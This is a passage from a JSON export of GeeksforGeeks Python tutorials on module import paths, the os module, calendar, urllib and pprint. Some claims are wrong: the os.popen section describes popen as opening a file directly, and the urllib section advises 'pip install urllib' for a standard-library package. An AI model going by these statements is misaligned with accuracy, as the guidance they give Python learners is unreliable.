isn\u2019t found in the current directory, Python then searches each directory in the shell variable PYTHONPATH. The PYTHONPATH is an environment variable, consisting of a list of directories.If that also fails python checks the installation-dependent list of directories configured at the time Python is installed.Example: Directories List for ModulesPython3# importing sys moduleimport sys\u00a0# importing sys.pathprint(sys.path)Output:[\u2018/home/nikhil/Desktop/gfg\u2019, \u2018/usr/lib/python38.zip\u2019, \u2018/usr/lib/python3.8\u2019, \u2018/usr/lib/python3.8/lib-dynload\u2019, \u201d, \u2018/home/nikhil/.local/lib/python3.8/site-packages\u2019, \u2018/usr/local/lib/python3.8/dist-packages\u2019, \u2018/usr/lib/python3/dist-packages\u2019, \u2018/usr/local/lib/python3.8/dist-packages/IPython/extensions\u2019, \u2018/home/nikhil/.ipython\u2019]Importing and renaming moduleWe can rename the module while importing it using the as keyword.\u00a0Example: Renaming the modulePython3# importing sqrt() and factorial from the# module mathimport math as gfg\u00a0# if we simply do \"import math\", then# math.sqrt(16) and math.factorial()# are required.print(gfg.sqrt(16))print(gfg.factorial(6))Output4.0\n720The dir() functionThe dir() built-in function returns a sorted list of strings containing the names defined by a module. The list contains the names of all the modules, variables, and functions that are defined in a module.Python3#\u00a0 Import built-in module\u00a0 randomimport\u00a0 randomprint(dir(random))\u00a0\u00a0Output:\u00a0[\u2018BPF\u2019, \u2018LOG4\u2019, \u2018NV_MAGICCONST\u2019, \u2018RECIP_BPF\u2019, \u2018Random\u2019, \u2018SG_MAGICCONST\u2019, \u2018SystemRandom\u2019, \u2018TWOPI\u2019, \u2018_BuiltinMethodType\u2019, \u2018_MethodType\u2019, \u2018_Sequence\u2019, \u2018_Set\u2019, \u2018__all__\u2019, \u2018__builtins__\u2019, \u2018__cached__\u2019, \u2018__doc__\u2019, \u2018__file__\u2019, \u2018__loader__\u2019, \u2018__name__\u2019, \u2018__package__\u2019, \u2018__spec__\u2019, \u2018_acos\u2019, \u2018_bisect\u2019, \u2018_ceil\u2019, \u2018_cos\u2019, \u2018_e\u2019, \u2018_exp\u2019, \u2018_inst\u2019, \u2018_itertools\u2019, \u2018_log\u2019, \u2018_pi\u2019, \u2018_random\u2019, \u2018_sha512\u2019, \u2018_sin\u2019, \u2018_sqrt\u2019, \u2018_test\u2019, \u2018_test_generator\u2019, \u2018_urandom\u2019, \u2018_warn\u2019, \u2018betavariate\u2019, \u2018choice\u2019, \u2018choices\u2019, \u2018expovariate\u2019, \u2018gammavariate\u2019, \u2018gauss\u2019, \u2018getrandbits\u2019, \u2018getstate\u2019, \u2018lognormvariate\u2019, \u2018normalvariate\u2019, \u2018paretovariate\u2019, \u2018randint\u2019, \u2018random\u2019, \u2018randrange\u2019, \u2018sample\u2019, \u2018seed\u2019, \u2018setstate\u2019, \u2018shuffle\u2019, \u2018triangular\u2019, \u2018uniform\u2019, \u2018vonmisesvariate\u2019, \u2018weibullvariate\u2019]Code Snippet illustrating python built-in modules:\u00a0\u00a0Python3# importing built-in module mathimport math\u00a0# using square root(sqrt) function contained# in math moduleprint(math.sqrt(25))\u00a0# using pi function contained in math moduleprint(math.pi)\u00a0# 2 radians = 114.59 degreesprint(math.degrees(2))\u00a0\u00a0# 60 degrees = 1.04 radiansprint(math.radians(60))\u00a0\u00a0# Sine of 2 radiansprint(math.sin(2))\u00a0\u00a0# Cosine of 0.5 radiansprint(math.cos(0.5))\u00a0\u00a0# Tangent of 0.23 radiansprint(math.tan(0.23))\u00a0# 1 * 2 * 3 * 4 = 24print(math.factorial(4))\u00a0\u00a0# importing built in module randomimport random\u00a0# printing random integer between 0 and 5print(random.randint(0, 5))\u00a0\u00a0# print random floating point number between 0 and 1print(random.random())\u00a0\u00a0# random number between 0 and 100print(random.random() * 100)\u00a0\u00a0List = [1, 4, True, 800, \"python\", 27, \"hello\"]\u00a0# using choice function in random module for choosing# a random element from a set such as a listprint(random.choice(List))\u00a0\u00a0# importing built in module datetimeimport datetimefrom datetime import dateimport time\u00a0# Returns the number of seconds since the# Unix Epoch, January 1st 1970print(time.time())\u00a0\u00a0# Converts a number of seconds to a date objectprint(date.fromtimestamp(454554))\u00a0Output:5.0\n3.14159265359\n114.591559026\n1.0471975512\n0.909297426826\n0.87758256189\n0.234143362351\n24\n3\n0.401533172951\n88.4917616788\nTrue\n1461425771.87\n1970-01-06\u00a0This article is contributed by Gaurav Shrestha. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1ec6cd361d6af70139024e395285261a",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The OS module in Python provides functions for interacting with the operating system. OS comes under Python\u2019s standard utility modules. This module provides a portable way of using operating system-dependent functionality. The *os* and *os.path* modules include many functions to interact with the file system.\u00a0Handling the Current Working DirectoryConsider Current Working Directory(CWD) as a folder, where the Python is operating. Whenever the files are called only by their name, Python assumes that it starts in the CWD which means that name-only reference will be successful only if the file is in the Python\u2019s CWD.Note: The folder where the Python script is running is known as the Current Directory. This is not the path where the Python script is located.Getting the Current working directoryTo get the location of the current working directory os.getcwd() is used.\u00a0Example:Python3# Python program to explain os.getcwd() method\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Get the current working# directory (CWD)cwd = os.getcwd()\u00a0\u00a0\u00a0\u00a0\u00a0# Print the current working# directory (CWD)print(\"Current working directory:\", cwd)Output:Current working directory: /home/nikhil/Desktop/gfgChanging the Current working directoryTo change the current working directory(CWD) os.chdir() method is used. This method changes the CWD to a specified path. It only takes a single argument as a new directory path.\u00a0Note: The current working directory is the folder in which the Python script is operating.\u00a0Example:Python3# Python program to change the# current working directory\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0import os\u00a0\u00a0\u00a0# Function to Get the current\u00a0# working directorydef current_path():\u00a0\u00a0\u00a0\u00a0print(\"Current working directory before\")\u00a0\u00a0\u00a0\u00a0print(os.getcwd())\u00a0\u00a0\u00a0\u00a0print()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver's code# Printing CWD beforecurrent_path()\u00a0\u00a0\u00a0# Changing the CWDos.chdir('../')\u00a0\u00a0\u00a0# Printing CWD aftercurrent_path()Output:Current working directory before\nC:\\Users\\Nikhil Aggarwal\\Desktop\\gfg\n\nCurrent working directory after\nC:\\Users\\Nikhil Aggarwal\\Desktop\u00a0Creating a DirectoryThere are different methods available in the OS module for creating a directory. These are \u2013os.mkdir()os.makedirs()Using os.mkdir()os.mkdir() method in Python is used to create a directory named path with the specified numeric mode. This method raises FileExistsError if the directory to be created already exists.\u00a0Example:\u00a0Python3# Python program to explain os.mkdir() method\u00a0# importing os moduleimport os\u00a0# Directorydirectory = \"GeeksforGeeks\"\u00a0# Parent Directory pathparent_dir = \"D:/Pycharm projects/\"\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0# Create the directory# 'GeeksForGeeks' in# '/home / User / Documents'os.mkdir(path)print(\"Directory '% s' created\" % directory)\u00a0# Directorydirectory = \"Geeks\"\u00a0# Parent Directory pathparent_dir = \"D:/Pycharm projects\"\u00a0# modemode = 0o666\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0# Create the directory# 'GeeksForGeeks' in# '/home / User / Documents'# with mode 0o666os.mkdir(path, mode)print(\"Directory '% s' created\" % directory)Output:Directory 'GeeksforGeeks' created\nDirectory 'Geeks' createdUsing os.makedirs()os.makedirs() method in Python is used to create a directory recursively. That means while making leaf directory if any intermediate-level directory is missing, os.makedirs() method will create them all.\u00a0Example:\u00a0Python3# Python program to explain os.makedirs() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Leaf directorydirectory = \"Nikhil\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoriesparent_dir = \"D:/Pycharm projects/GeeksForGeeks/Authors\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(parent_dir, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Create the directory# 'Nikhil'os.makedirs(path)print(\"Directory '% s' created\" % directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Directory 'GeeksForGeeks' and 'Authors' will# be created too# if it does not exists\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Leaf directorydirectory = \"c\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoriesparent_dir = \"D:/Pycharm projects/GeeksforGeeks/a/b\"\u00a0\u00a0\u00a0\u00a0\u00a0# modemode = 0o666\u00a0\u00a0\u00a0\u00a0\u00a0path = os.path.join(parent_dir, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Create the directory 'c'\u00a0\u00a0\u00a0\u00a0\u00a0os.makedirs(path, mode)print(\"Directory '% s' created\" % directory)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# 'GeeksForGeeks', 'a', and 'b'# will also be created if# it does not exists\u00a0\u00a0\u00a0\u00a0\u00a0# If any of the intermediate level# directory is missing# os.makedirs() method will# create them\u00a0\u00a0\u00a0\u00a0\u00a0# os.makedirs() method can be# used to create a directory treeOutput:Directory 'Nikhil' created\nDirectory 'c' createdListing out Files and Directories with Pythonos.listdir() method in Python is used to get the list of all files and directories in the specified directory. If we don\u2019t specify any directory, then the list of files and directories in the current working directory will be returned.\u00a0Example:Python3# Python program to explain os.listdir() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0# Get the list of all files and directories# in the root directorypath = \"/\"dir_list = os.listdir(path)\u00a0print(\"Files and directories in '\", path, \"' :\")\u00a0# print the listprint(dir_list)Output:Files and directories in ' / ' :\n['sys', 'run', 'tmp', 'boot', 'mnt', 'dev', 'proc', 'var', 'bin', 'lib64', 'usr', \n'lib', 'srv', 'home', 'etc', 'opt', 'sbin', 'media']\u00a0Deleting Directory or Files using PythonOS module proves different methods for removing directories and files in Python. These are \u2013\u00a0Using os.remove()Using os.rmdir()Using os.remove()os.remove() method in Python is used to remove or delete a file path. This method can not remove or delete a directory. If the specified path is a directory then OSError will be raised by the method.\u00a0Example: Suppose the file contained in the folder are:\u00a0Python3# Python program to explain os.remove() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# File namefile = 'file1.txt'\u00a0\u00a0\u00a0\u00a0\u00a0# File locationlocation = \"D:/Pycharm projects/GeeksforGeeks/Authors/Nikhil/\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(location, file)\u00a0\u00a0\u00a0\u00a0\u00a0# Remove the file# 'file.txt'os.remove(path)e)Output:Using os.rmdir()os.rmdir() method in Python is used to remove or delete an empty directory. OSError will be raised if the specified path is not an empty directory.\u00a0Example: Suppose the directories are\u00a0Python3# Python program to explain os.rmdir() method\u00a0\u00a0\u00a0\u00a0\u00a0# importing os moduleimport os\u00a0\u00a0\u00a0\u00a0\u00a0# Directory namedirectory = \"Geeks\"\u00a0\u00a0\u00a0\u00a0\u00a0# Parent Directoryparent = \"D:/Pycharm projects/\"\u00a0\u00a0\u00a0\u00a0\u00a0# Pathpath = os.path.join(parent, directory)\u00a0\u00a0\u00a0\u00a0\u00a0# Remove the Directory# \"Geeks\"os.rmdir(path)Output:\u00a0Commonly Used Functions1. os.name: This function gives the name of the operating system dependent module imported. The following names have currently been registered: \u2018posix\u2019, \u2018nt\u2019, \u2018os2\u2019, \u2018ce\u2019, \u2018java\u2019 and \u2018riscos\u2019.Python3import os\u00a0print(os.name)Output:posixNote: It may give different output on different interpreters, such as \u2018posix\u2019 when you run the code here.\u00a02. os.error: All functions in this module raise OSError in the case of invalid or inaccessible file names and paths, or other arguments that have the correct type, but are not accepted by the operating system. os.error is an alias for built-in OSError exception.\u00a0Python3import os\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0# If the file does not exist,\u00a0\u00a0\u00a0\u00a0# then it would throw an IOError\u00a0\u00a0\u00a0\u00a0filename = 'GFG.txt'\u00a0\u00a0\u00a0\u00a0f = open(filename, 'rU')\u00a0\u00a0\u00a0\u00a0text = f.read()\u00a0\u00a0\u00a0\u00a0f.close()\u00a0# Control jumps directly to here if# any of the above lines throws IOError.\u00a0\u00a0\u00a0except IOError:\u00a0\u00a0\u00a0\u00a0\u00a0# print(os.error) will <class 'OSError'>\u00a0\u00a0\u00a0\u00a0print('Problem reading: ' + filename)\u00a0\u00a0\u00a0\u00a0\u00a0# In any case, the code then continues with# the line after the try/exceptOutput:\u00a0Problem reading: GFG.txt\u00a03. os.popen(): This method opens a pipe to or from command. The return value can be read or written depending on whether the mode is \u2018r\u2019 or \u2018w\u2019.\u00a0Syntax:\u00a0 os.popen(command[, mode[, bufsize]])Parameters mode & bufsize are not necessary parameters, if not provided, default \u2018r\u2019 is taken for mode.\u00a0Python3import osfd = \"GFG.txt\"\u00a0# popen() is similar to open()file = open(fd, 'w')file.write(\"Hello\")file.close()file = open(fd, 'r')text = file.read()print(text)\u00a0# popen() provides a pipe/gateway and accesses the file directlyfile = os.popen(fd, 'w')file.write(\"Hello\")# File not closed, shown in next function.Output:\u00a0HelloNote: Output for popen() will not be shown, there would be direct changes into the file.\u00a04. os.close(): Close file descriptor fd. A file opened using open(), can be closed by close()only. But file opened through os.popen(), can be closed with close() or os.close(). If we try closing a file opened with open(), using os.close(), Python would throw TypeError.\u00a0Python3import os\u00a0\u00a0fd = \"GFG.txt\"file = open(fd, 'r')text = file.read()print(text)os.close(file)Output:\u00a0Traceback (most recent call last):\n  File \"C:\\Users\\GFG\\Desktop\\GeeksForGeeksOSFile.py\", line 6, in \n    os.close(file)\nTypeError: an integer is required (got type _io.TextIOWrapper)Note: The same error may not be thrown, due to the non-existent file or permission privilege.\u00a05. os.rename(): A file old.txt can be renamed to new.txt, using the function os.rename(). The name of the file changes only if, the file exists and the user has sufficient privilege permission to change the file.Pythonimport os\u00a0\u00a0fd = \"GFG.txt\"os.rename(fd,'New.txt')os.rename(fd,'New.txt')Output:Traceback (most recent call last):\n  File \"C:\\Users\\GFG\\Desktop\\ModuleOS\\GeeksForGeeksOSFile.py\", line 3, in \n    os.rename(fd,'New.txt')\nFileNotFoundError: [WinError 2] The system cannot find the\nfile specified: 'GFG.txt' -> 'New.txt'Understanding the Output: A file name \u201cGFG.txt\u201d exists, thus when os.rename() is used the first time, the file gets renamed. Upon calling the function os.rename() second time, file \u201cNew.txt\u201d exists and not \u201cGFG.txt\u201d\u00a0thus Python throws FileNotFoundError.\u00a0\u00a06. os.remove(): Using the Os module we can remove a file in our system using the remove() method. To remove a file we need to pass the name of the file as a parameter.\u00a0Python3import os #importing os module.\u00a0os.remove(\"file_name.txt\") #removing the file.The OS module provides us a layer of abstraction between us and the operating system. When we are working with os module always specify the absolute path depending upon the operating system the code can run on any os but we need to change the path exactly. If you try to remove a file that does not exist you will get FileNotFoudError.\u00a07. os.path.exists(): This method will check whether a file exists or not by passing the name of the file as a parameter. OS module has a sub-module named PATH by using which we can perform many more functions.\u00a0Python3import os#importing os module\u00a0result = os.path.exists(\"file_name\") #giving the name of the file as a parameter.\u00a0print(result)OutputFalseAs in the above code, the file does not exist it will give output False. If the file exists it will give us output True.\u00a08. os.path.getsize(): In this method, python will give us the size of the file in bytes. To use this method we need to pass the name of the file as a parameter.Python3import os #importing os module\u00a0size = os.path.getsize(\"filename\")\u00a0print(\"Size of the file is\", size,\" bytes.\")Output:Size of the file is 192 bytes.This article is contributed by Piyush Doorwar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0d7d01107b59d8920fcb55a275ddb3c1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python defines an inbuilt module calendar that handles operations related to the calendar.\u00a0The calendar module allows output calendars like the program and provides additional useful functions related to the calendar. Functions and classes defined in the Calendar module use an idealized calendar, the current Gregorian calendar extended indefinitely in both directions. By default, these calendars have Monday as the first day of the week, and Sunday as the last (the European convention).Example #1: Display the Calendar of a given month.\u00a0Python3# Python program to display calendar of# given month of the year\u00a0\u00a0\u00a0# import moduleimport calendar\u00a0\u00a0\u00a0yy = 2017mm = 11\u00a0\u00a0\u00a0# display the calendarprint(calendar.month(yy, mm))Output:\u00a0\u00a0Example #2: Display calendar of the given year.\u00a0Python3# Python code to demonstrate the working of# calendar() function to print calendar\u00a0\u00a0\u00a0# importing calendar module# for calendar operationsimport calendar\u00a0\u00a0\u00a0# using calendar to print calendar of year# prints calendar of 2018print (\"The calendar of year 2018 is : \")print (calendar.calendar(2018, 2, 1, 6))Output:\u00a0\u00a0\u00a0\u00a0class calendar.Calendar :\u00a0The calendar class creates a Calendar object. A Calendar object provides several methods that can be used for preparing the calendar data for formatting. This class doesn\u2019t do any formatting itself. This is the job of subclasses. Calendar class allows the calculations for various tasks based on date, month, and year. Calendar class provides the following methods:\u00a0FunctionDescriptioniterweekdays()Returns an iterator for the week day numbers that will be used for one weekitermonthdates()Returns an iterator for the month (1\u201312) in the yearitermonthdays()Returns an iterator of a specified month and a yearitermonthdays2()Method is used to get an iterator for the month in the year similar to itermonthdates(). Days returned will be tuples consisting of a day of the month number and a week day number.itermonthdays3()Returns an iterator for the month in the year similar to itermonthdates(), but not restricted by the datetime.date range. Days returned will be tuples consisting of a year, a month and a day of the month numbers.itermonthdays4()Returns an iterator for the month in the year similar to itermonthdates(), but not restricted by the datetime.date range. Days returned will be tuples consisting of a year, a month, a day of the month, and a day of the week numbers.monthdatescalendar()Used to get a list of the weeks in the month of the year as full weeksmonthdays2calendar()Used to get a list of the weeks in the month of the year as full weeksmonthdayscalendarUsed to get a list of the weeks in the month of the year as full weeksyeardatescalendar()Used to get a list of the weeks in the month of the year as full weeksyeardays2calendar()Used to get the data for specified year. Entries in the week lists are tuples of day numbers and weekday numbersyeardayscalendar()Used to get the data for specified year. Entries in the week lists are day numbers\u00a0\u00a0class calendar.TextCalendar :\u00a0TextCalendar class can be used to generate plain text calendars. TextCalendar class in Python allows you to edit the calendar and use it as per your requirement.\u00a0\u00a0FunctionDescriptionformatmonth()Method is used to get month\u2019s calendar in a multi-line stringprmonth()Method is used to print a month\u2019s calendar as returned by formatmonth()formatyear()Method is used to get m-column calendar for an entire year as a multi-line stringpryear()Method is used to print the calendar for an entire year as returned by formatmonth()\u00a0\u00a0class calendar.HTMLCalendar :\u00a0HTMLCalendar class can be used to generate HTML calendars. HTMLCalendar class in Python allows you to edit the calendar and use as per your requirement.\u00a0\u00a0FunctionDescriptionformatmonth()Method is used to get month\u2019s calendar as an HTML tableformatyear()Method is used to get year\u2019s calendar as an HTML table.formatyearpage()Method is used to get year\u2019s calendar as a complete HTML page\u00a0\u00a0Simple TextCalendar class :For simple text calendars calendar module provides the following functions :\u00a0\u00a0FunctionDescriptionsetfirstweekday()Function sets the day start number of weekfirstweekday()Function returns the first week day number. By default 0 (Monday)isleap()Function checks if year mentioned in argument is leap or notleapdays()Function returns the number of leap days between the specified years in argumentsweekday()Function returns the week day number(0 is Monday) of the date specified in its argumentsweekheader()Returns a header containing abbreviated weekday namesmonthrange()Function returns two integers, first, the starting day number of week(0 as monday), second, the number of days in the monthmonthcalendar()Returns a matrix representing a month\u2019s calendar. Each row represents a week; days outside of the month are represented by zerosprmonth()Function also prints the month of specific year but there is no need of \u201cprint\u201d operation to execute thismonth()Function prints the month of a specific year mentioned in argumentsprcal()Function also prints the calendar of specific year but there is no need of \u201cprint\u201d operation to execute thiscalendar()Function displays the year, width of characters, no. of lines per week and column separations.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d50b2f30c34362966cc89a440c616a19",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Urllib package is the URL handling module for python. It is used to fetch URLs (Uniform Resource Locators). It uses the urlopen function and is able to fetch URLs using a variety of different protocols.Urllib is a package that collects several modules for working with URLs, such as:urllib.request for opening and reading.urllib.parse for parsing URLsurllib.error for the exceptions raisedurllib.robotparser for parsing robot.txt filesIf urllib is not present in your environment, execute the below code to install it.\r\npip install urllib\r\nLet\u2019s see these in details.urllib.requestThis module helps to define functions and classes to open URLs (mostly HTTP). One of the most simple ways to open such URLs is :urllib.request.urlopen(url)We can see this in an example:import urllib.requestrequest_url = urllib.request.urlopen('https://www.geeksforgeeks.org/')print(request_url.read())\r\nThe source code of the URL i.e. Geeksforgeeks.\r\nurllib.parseThis module helps to define functions to manipulate URLs and their components parts, to build or break them. It usually focuses on splitting a URL into small components; or joining different URL components into URL strings.We can see this from the below code:from urllib.parse import * parse_url = urlparse('https://www.geeksforgeeks.org / python-langtons-ant/')print(parse_url)print(\"\\n\")unparse_url = urlunparse(parse_url)print(unparse_url)\r\nParseResult(scheme='https', netloc='www.geeksforgeeks.org', path='/python-langtons-ant/', params='', query='', fragment='')\r\n\r\nhttps://www.geeksforgeeks.org/python-langtons-ant/\r\nNote:- The different components of a URL are separated and joined again. Try using some other URL for better understanding.Different other functions of urllib.parse are :FunctionUseurllib.parse.urlparseSeparates different components of URLurllib.parse.urlunparseJoin different components of URLurllib.parse.urlsplitIt is similar to urlparse() but doesn\u2019t split the paramsurllib.parse.urlunsplitCombines the tuple element returned by urlsplit() to form URLurllib.parse.urldeflagIf URL contains fragment, then it returns a URL removing the fragment.urllib.errorThis module defines the classes for exception raised by urllib.request. Whenever there is an error in fetching a URL, this module helps in raising exceptions. The following are the exceptions raised :URLError \u2013 It is raised for the errors in URLs, or errors while fetching the URL due to connectivity, and has a \u2018reason\u2019 property that tells a user the reason of error.HTTPError \u2013 It is raised for the exotic HTTP errors, such as the authentication request errors. It is a subclass or URLError. Typical errors include \u2018404\u2019 (page not found), \u2018403\u2019 (request forbidden),and \u2018401\u2019 (authentication required).We can see this in following examples :# URL Error\u00a0\u00a0import urllib.requestimport urllib.parse\u00a0\u00a0# trying to read the URL but with no internet connectivitytry:\u00a0\u00a0\u00a0\u00a0x = urllib.request.urlopen('https://www.google.com')\u00a0\u00a0\u00a0\u00a0print(x.read())\u00a0\u00a0# Catching the exception generated\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e :\u00a0\u00a0\u00a0\u00a0print(str(e))\r\nURL Error: urlopen error [Errno 11001] getaddrinfo failed\r\n# HTTP Error\u00a0\u00a0import urllib.requestimport urllib.parse\u00a0\u00a0# trying to read the URLtry:\u00a0\u00a0\u00a0\u00a0x = urllib.request.urlopen('https://www.google.com / search?q = test')\u00a0\u00a0\u00a0\u00a0print(x.read())\u00a0\u00a0# Catching the exception generated\u00a0\u00a0\u00a0\u00a0except Exception as e :\u00a0\u00a0\u00a0\u00a0print(str(e))\r\nHTTP Error 403: Forbidden\r\nurllib.robotparserThis module contains a single class, RobotFileParser. This class answers question about whether or not a particular user can fetch a URL that published robot.txt files. Robots.txt is a text file webmasters create to instruct web robots how to crawl pages on their website. The robot.txt file tells the web scraper about what parts of the server should not be accessed.For example :# importing robot parser classimport urllib.robotparser as rb\u00a0\u00a0bot = rb.RobotFileParser()\u00a0\u00a0# checks where the website's robot.txt file residex = bot.set_url('https://www.geeksforgeeks.org / robot.txt')print(x)\u00a0\u00a0# reads the filesy = bot.read()print(y)\u00a0\u00a0# we can crawl the main sitez = bot.can_fetch('*', 'https://www.geeksforgeeks.org/')print(z)\u00a0\u00a0# but can not crawl the disallowed urlw = bot.can_fetch('*', 'https://www.geeksforgeeks.org / wp-admin/')print(w)\r\nNone\r\nNone\r\nTrue\r\nFalse\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "77241aa99cc20b322b69af99e7f49cee",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article is about a pretty useful built-in module in Python, pprint.The pprint module provides a capability to \u201cpretty-print\u201d arbitrary Python data structures in a well-formatted and more readable way!Let us consider an example:# A python code without pprintimport requests\u00a0def geocode(address):\u00a0\u00a0\u00a0\u00a0url = \"https://maps.googleapis.com/maps/api/geocode/json\"\u00a0\u00a0\u00a0\u00a0resp = requests.get(url, params = {'address': address})\u00a0\u00a0\u00a0\u00a0return resp.json()\u00a0# calling geocode functiondata = geocode('India gate')\u00a0# printing json responseprint(data)The above code is for getting the geocode information of a place using Google Maps API in JSON format.The output of above program looks like this:{'status': 'OK', 'results': [{'address_components': [{'long_name': 'Rajpath', 'types': ['route'], \n'short_name': 'Rajpath'}, {'long_name': 'India Gate', 'types': ['political', 'sublocality', \n'sublocality_level_1'], 'short_name': 'India Gate'}, {'long_name': 'New Delhi', 'types': \n['locality', 'political'], 'short_name': 'New Delhi'}, {'long_name': 'New Delhi', \n'types': ['administrative_area_level_2', 'political'], 'short_name': 'New Delhi'}, {'long_name': \n'Delhi', 'types': ['administrative_area_level_1', 'political'], 'short_name': 'DL'}, {'long_name': \n'India', 'types': ['country', 'political'], 'short_name': 'IN'}, {'long_name': '110001', 'types': \n['postal_code'], 'short_name': '110001'}], 'geometry': {'location': {'lng': 77.2295097, 'lat': 28.612912}, \n'viewport': {'northeast': {'lng': 77.2308586802915, 'lat': 28.6142609802915}, 'southwest': {'lng': \n77.22816071970848, 'lat': 28.6115630197085}}, 'location_type': 'APPROXIMATE'}, 'types': \n['establishment', 'point_of_interest'], 'formatted_address': 'Rajpath, India Gate, New Delhi, Delhi 110001, \nIndia', 'place_id': 'ChIJC03rqdriDDkRXT6SJRGXFwc'}]}As you can see, this output is not properly indented which affects readability for nested data structures.Now, consider the code below:# A python code with pprintimport requestsfrom pprint import pprint\u00a0def geocode(address):\u00a0\u00a0\u00a0\u00a0url = \"https://maps.googleapis.com/maps/api/geocode/json\"\u00a0\u00a0\u00a0\u00a0resp = requests.get(url, params = {'address': address})\u00a0\u00a0\u00a0\u00a0return resp.json()\u00a0# calling geocode functiondata = geocode('India gate')\u00a0# pretty-printing json responsepprint(data)The output of above code looks like this:{'results': [{'address_components': [{'long_name': 'Rajpath',\n                                      'short_name': 'Rajpath',\n                                      'types': ['route']},\n                                     {'long_name': 'India Gate',\n                                      'short_name': 'India Gate',\n                                      'types': ['political',\n                                                'sublocality',\n                                                'sublocality_level_1']},\n                                     {'long_name': 'New Delhi',\n                                      'short_name': 'New Delhi',\n                                      'types': ['locality', 'political']},\n                                     {'long_name': 'New Delhi',\n                                      'short_name': 'New Delhi',\n                                      'types': ['administrative_area_level_2',\n                                                'political']},\n                                     {'long_name': 'Delhi',\n                                      'short_name': 'DL',\n                                      'types': ['administrative_area_level_1',\n                                                'political']},\n                                     {'long_name': 'India',\n                                      'short_name': 'IN',\n                                      'types': ['country', 'political']},\n                                     {'long_name': '110001',\n                                      'short_name': '110001',\n                                      'types': ['postal_code']}],\n              'formatted_address': 'Rajpath, India Gate, New Delhi, Delhi '\n                                   '110001, India',\n              'geometry': {'location': {'lat': 28.612912, 'lng': 77.2295097},\n                           'location_type': 'APPROXIMATE',\n                           'viewport': {'northeast': {'lat': 28.6142609802915,\n                                                      'lng': 77.2308586802915},\n                                        'southwest': {'lat': 28.6115630197085,\n                                                      'lng': 77.22816071970848}}},\n              'place_id': 'ChIJC03rqdriDDkRXT6SJRGXFwc',\n              'types': ['establishment', 'point_of_interest']}],\n 'status': 'OK'}\nAs you can see, the output is now well formatted and much more readable.All we did was to import the pprint function of pprint module. And use pprint() function rather than the print function!This blog is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7393259b91146335c37818a1e7d876ce",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
